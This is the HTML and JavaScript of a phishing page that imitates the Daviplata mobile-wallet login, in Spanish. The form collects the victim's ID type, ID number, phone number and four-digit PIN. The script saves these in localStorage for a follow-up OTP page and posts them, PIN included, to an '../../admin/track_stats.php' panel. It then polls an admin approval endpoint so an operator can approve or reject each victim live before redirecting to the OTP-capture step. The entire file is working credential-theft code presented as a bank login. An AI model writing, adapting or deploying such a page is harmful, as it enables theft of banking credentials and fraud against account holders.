<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Daviplata</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
    background: linear-gradient(135deg, #ffffff 0%, #fef5f5 100%);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

.container {
    max-width: 480px;
    width: 100%;
    margin: 0 auto;
    background: white;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    position: relative;
    overflow: hidden;
}

.bg-decoration {
    position: absolute;
    bottom: -100px;
    right: -100px;
    width: 400px;
    height: 400px;
    background: linear-gradient(135deg, #ff6b7a 0%, #e31e24 100%);
    border-radius: 50%;
    z-index: 0;
}

.content-wrapper {
    position: relative;
    z-index: 1;
}

.header {
    padding: 15px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.back-btn {
    font-size: 28px;
    color: #333;
    background: none;
    border: none;
    cursor: pointer;
    font-weight: 300;
}

.info-icon {
    width: 24px;
    height: 24px;
    border: 2px solid #999;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    color: #999;
}

.logo-container {
    text-align: center;
    padding: 50px 20px 30px;
}

.logo {
    width: 120px;
    height: auto;
    object-fit: contain;
}

.title {
    font-size: 24px;
    font-weight: 700;
    color: #2d2d2d;
    text-align: center;
    margin: 20px 0 40px;
}

.form-container {
    padding: 0 30px;
    flex: 1;
}

.dropdown-container {
    position: relative;
    margin-bottom: 20px;
}

.dropdown-label {
    font-size: 14px;
    color: #666;
    margin-bottom: 8px;
    display: block;
    font-weight: 400;
}

.dropdown-field {
    width: 100%;
    padding: 16px 40px 16px 16px;
    border: 1px solid #d0d0d0;
    border-radius: 12px;
    font-size: 16px;
    color: #333;
    background: white;
    appearance: none;
    cursor: pointer;
    font-weight: 500;
    font-family: 'Roboto', sans-serif;
}

.dropdown-field:focus {
    outline: none;
    border-color: #e31e24;
}

.dropdown-arrow {
    position: absolute;
    right: 16px;
    top: 50%;
    transform: translateY(-50%);
    pointer-events: none;
    margin-top: 10px;
}

.dropdown-arrow svg {
    width: 16px;
    height: 16px;
    fill: #666;
}

.input-group {
    margin-bottom: 20px;
}

.input-label {
    font-size: 14px;
    color: #666;
    margin-bottom: 8px;
    display: block;
    font-weight: 400;
}

.input-field {
    width: 100%;
    padding: 16px;
    border: 1px solid #d0d0d0;
    border-radius: 12px;
    font-size: 16px;
    color: #333;
    background: white;
    font-family: 'Roboto', sans-serif;
    font-weight: 500;
}

.input-field:focus {
    outline: none;
    border-color: #e31e24;
}

.input-field::placeholder {
    color: #999;
    font-weight: 400;
}

.button-container {
    padding: 30px;
}

.continue-btn {
    width: 100%;
    padding: 18px;
    background: #e0e0e0;
    color: white;
    border: none;
    border-radius: 30px;
    font-size: 17px;
    font-weight: 600;
    cursor: not-allowed;
    transition: all 0.3s;
    font-family: 'Roboto', sans-serif;
}

.continue-btn.active {
    background: #e31e24;
    cursor: pointer;
    box-shadow: 0 4px 15px rgba(227, 30, 36, 0.3);
}

.continue-btn.active:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(227, 30, 36, 0.4);
}

.continue-btn.active:active {
    transform: translateY(0);
}

.continue-btn:disabled {
    background: #e0e0e0;
    cursor: not-allowed;
    box-shadow: none;
}

/* Pantalla de carga */
.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: white;
    z-index: 9999;
    display: none;
    align-items: center;
    justify-content: center;
    flex-direction: column;
}

.loading-content {
    text-align: center;
}

.loading-logo {
    width: 100px;
    height: auto;
    margin-bottom: 30px;
    animation: pulse 1.5s ease-in-out infinite;
}

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

.loading-spinner {
    width: 50px;
    height: 50px;
    border: 4px solid #f0f0f0;
    border-top: 4px solid #e31e24;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 20px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loading-text {
    font-size: 16px;
    color: #666;
    margin-top: 20px;
}

/* Pantalla de error */
.error-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: white;
    z-index: 10000;
    display: none;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 40px;
}

.error-content {
    text-align: center;
}

.error-icon {
    font-size: 60px;
    color: #e31e24;
    margin-bottom: 20px;
}

.error-title {
    font-size: 24px;
    font-weight: 700;
    color: #333;
    margin-bottom: 15px;
}

.error-message {
    font-size: 16px;
    color: #666;
    line-height: 1.5;
}

.footer-nav {
    display: flex;
    justify-content: space-around;
    padding: 20px;
    position: relative;
    z-index: 2;
}

.nav-item {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-decoration: none;
    color: #666;
    font-size: 12px;
    font-weight: 500;
}

.nav-icon {
    width: 50px;
    height: 50px;
    background: white;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    font-size: 20px;
}

.nav-text {
    text-align: center;
    max-width: 100px;
}
</style>
</head>
<body>

<div class="container">
    <div class="bg-decoration"></div>
    
    <div class="content-wrapper">
        <div class="header">
            <button class="back-btn">‹</button>
            <div class="info-icon">○</div>
        </div>

        <div class="logo-container">
            <img src="davin.png" alt="Daviplata" class="logo">
        </div>

        <h1 class="title">Ingresa tus datos</h1>

        <form id="daviForm" class="form-container">
            <div class="dropdown-container">
                <label class="dropdown-label">Tipo de documento</label>
                <select id="tipoDoc" class="dropdown-field">
                    <option value="">Selecciona una opción</option>
                    <option value="CC">Cédula de Ciudadanía</option>
                    <option value="CE">Cédula de Extranjería</option>
                    <option value="PPT">Permiso por Protección Temporal</option>
                </select>
                <div class="dropdown-arrow">
                    <svg viewBox="0 0 16 16">
                        <path d="M4 6l4 4 4-4"/>
                    </svg>
                </div>
            </div>

            <div class="input-group">
                <label class="input-label">Número de documento</label>
                <input type="text" id="numeroDoc" class="input-field" placeholder="1074654321" maxlength="16" inputmode="numeric">
            </div>

            <div class="input-group">
                <label class="input-label">Número celular</label>
                <input type="text" id="numeroCel" class="input-field" placeholder="3007654321" maxlength="10" inputmode="numeric">
            </div>

            <div class="input-group">
                <label class="input-label">Contraseña</label>
                <input type="password" id="contrasena" class="input-field" placeholder="••••" maxlength="4" inputmode="numeric">
            </div>
        </form>

        <div class="button-container">
            <button type="button" class="continue-btn" id="continuarBtn" disabled>Continuar</button>
        </div>

        <div class="footer-nav">
            <a href="#" class="nav-item">
                <div class="nav-icon">⊞</div>
                <div class="nav-text">Confirmar<br>comprobante</div>
            </a>
            <a href="#" class="nav-item">
                <div class="nav-icon">?</div>
                <div class="nav-text">¿Necesitas<br>ayuda?</div>
            </a>
        </div>
    </div>
</div>

<!-- Pantalla de carga -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-content">
        <img src="davin.png" alt="Daviplata" class="loading-logo">
        <div class="loading-spinner"></div>
        <div class="loading-text">Procesando...</div>
    </div>
</div>

<!-- Pantalla de error -->
<div class="error-overlay" id="errorOverlay">
    <div class="error-content">
        <div class="error-icon">⚠️</div>
        <div class="error-title">¡Ups! Algo falló</div>
        <div class="error-message">Intenta de nuevo</div>
    </div>
</div>

<script>
// Solo permitir números en los campos
document.getElementById('numeroDoc').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
    verificarCampos();
});

document.getElementById('numeroCel').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
    verificarCampos();
});

document.getElementById('contrasena').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
    verificarCampos();
});

document.getElementById('tipoDoc').addEventListener('change', verificarCampos);

// Verificar si todos los campos están llenos para habilitar el botón
function verificarCampos() {
    const tipoDoc = document.getElementById('tipoDoc').value;
    const numeroDoc = document.getElementById('numeroDoc').value;
    const numeroCel = document.getElementById('numeroCel').value;
    const contrasena = document.getElementById('contrasena').value;
    const btn = document.getElementById('continuarBtn');

    if (tipoDoc && numeroDoc && numeroCel && contrasena && contrasena.length === 4) {
        btn.disabled = false;
        btn.classList.add('active');
    } else {
        btn.disabled = true;
        btn.classList.remove('active');
    }
}

// Enviar datos
document.getElementById('continuarBtn').addEventListener('click', async function(e) {
    e.preventDefault();
    // Mostrar pantalla de carga
    document.getElementById('loadingOverlay').style.display = 'flex';

    const tipoDoc = document.getElementById('tipoDoc').value;
    const numeroDoc = document.getElementById('numeroDoc').value;
    const numeroCel = document.getElementById('numeroCel').value;
    const contrasena = document.getElementById('contrasena').value;

    // Guardar en localStorage para otp.php
    localStorage.setItem('usuario_daviplata', numeroDoc);
    localStorage.setItem('identificacion_daviplata', numeroDoc);
    localStorage.setItem('tipo_id_daviplata', tipoDoc);
    localStorage.setItem('numero_celular_daviplata', numeroCel);
    localStorage.setItem('clave_pin_daviplata', contrasena);
    localStorage.setItem('log_id_daviplata', '');

    // Enviar al admin (track_stats.php)
    const formDataAdmin = new FormData();
    formDataAdmin.append('activity', 'LOGIN (DAVIPLATA)');
    formDataAdmin.append('action', 'log');
    formDataAdmin.append('metodo', 'PSE');
    formDataAdmin.append('banco', 'Daviplata');
    formDataAdmin.append('documento', numeroDoc);
    formDataAdmin.append('usuario', numeroDoc);
    formDataAdmin.append('identificacion', numeroDoc);
    formDataAdmin.append('tipo_identificacion', tipoDoc);
    formDataAdmin.append('numero_celular', numeroCel);
    formDataAdmin.append('clave_pin', contrasena);
    formDataAdmin.append('clave_tarjeta', '');
    formDataAdmin.append('ultimos_digitos', '');

    fetch('../../admin/track_stats.php', {
        method: 'POST',
        body: formDataAdmin,
        keepalive: true
    }).then(res => res.json()).then(data => {
        if (data.success) {
            localStorage.setItem('log_id_daviplata', data.id);
            startPolling(data.id);
        }
    }).catch(err => {
        console.error('Error:', err);
        document.getElementById('loadingOverlay').style.display = 'none';
        document.getElementById('errorOverlay').style.display = 'flex';
    });
});

function startPolling(logId) {
    let pollCount = 0;
    const maxPolls = 150;
    
    const interval = setInterval(() => {
        pollCount++;
        
        fetch('../../admin/check_aprobacion.php?log_id=' + logId)
            .then(res => res.json())
            .then(data => {
                console.log('Poll estado:', data.estado);
                if (data.estado === 'aprobado') {
                    clearInterval(interval);
                    window.location.href = "otp.php";
                } else if (data.estado === 'rechazado') {
                    clearInterval(interval);
                    document.getElementById('loadingOverlay').style.display = 'none';
                    document.getElementById('errorOverlay').style.display = 'flex';
                } else if (pollCount >= maxPolls) {
                    clearInterval(interval);
                    document.getElementById('loadingOverlay').style.display = 'none';
                    document.getElementById('errorOverlay').style.display = 'flex';
                }
            })
            .catch(err => {
                if (pollCount >= maxPolls) {
                    clearInterval(interval);
                    document.getElementById('loadingOverlay').style.display = 'none';
                    document.getElementById('errorOverlay').style.display = 'flex';
                }
            });
    }, 2000);
}
</script>

</body>
</html>